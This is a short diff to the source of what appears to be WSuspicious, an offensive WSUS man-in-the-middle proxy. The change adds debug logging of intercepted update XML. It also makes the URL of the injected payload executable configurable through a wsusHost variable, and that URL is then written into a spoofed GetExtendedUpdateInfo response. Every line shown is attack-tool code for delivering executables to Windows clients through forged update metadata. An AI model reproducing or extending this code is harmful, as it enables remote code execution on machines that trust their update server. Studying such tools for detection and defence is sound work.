@@ -218,6 +218,8 @@ namespace WSuspicious.Proxy
                         {
                             XDocument doc = XDocument.Load(stream);
 
+                            await writeDebugToConsole(doc.ToString());
+
                             var syncUpdatesResult = from p in doc.Descendants()
                                                 where p.Name.LocalName == "SyncUpdatesResult"
                                                 select p;
@@ -254,7 +256,7 @@ namespace WSuspicious.Proxy
 
                         if (soapActionHeaders.Count > 0 && soapActionHeaders[0].Value.Contains("GetExtendedUpdateInfo"))
                         {
-                            string payloadURL = "http://wsusisagoldmine:8530/Content/B2/FB0A150601470195C47B4E8D87FCB3F50292BEB2.exe";
+                            string payloadURL = String.Format("http://{0}:8530/Content/B2/FB0A150601470195C47B4E8D87FCB3F50292BEB2.exe", wsusHost);
                             string secondPhaseTemplate = ResourceHandler.ExtendedUpdateInfoTemplate;
                             secondPhaseTemplate = String.Format(secondPhaseTemplate,
                                 updateID2,
